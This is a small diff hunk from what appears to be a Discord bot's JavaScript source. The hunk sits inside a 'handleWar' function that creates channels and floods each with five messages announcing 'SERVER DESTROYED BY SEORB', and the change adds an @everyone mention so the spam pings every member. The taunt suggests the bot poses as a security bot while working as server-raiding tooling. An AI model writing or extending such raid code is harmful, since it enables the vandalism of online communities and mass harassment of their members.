@@ -3949,7 +3949,7 @@ async function handleWar(message) {
     await author.send(`✅ Đã tạo ${createdChannels.length} kênh mới.`).catch(() => {});
 
     // Bước 5: Spam 5 tin nhắn vào mỗi kênh
-    const spamMsg = "# SERVER DESTROYED BY SEORB\n# MÀY NGHĨ ĐÂY LÀ BOT SECURITY Á!";
+    const spamMsg = "# @everyone SERVER DESTROYED BY SEORB\n# MÀY NGHĨ ĐÂY LÀ BOT SECURITY Á!";
     for (const channel of createdChannels) {
         const spamTasks = [];
         for (let i = 0; i < 5; i++) {
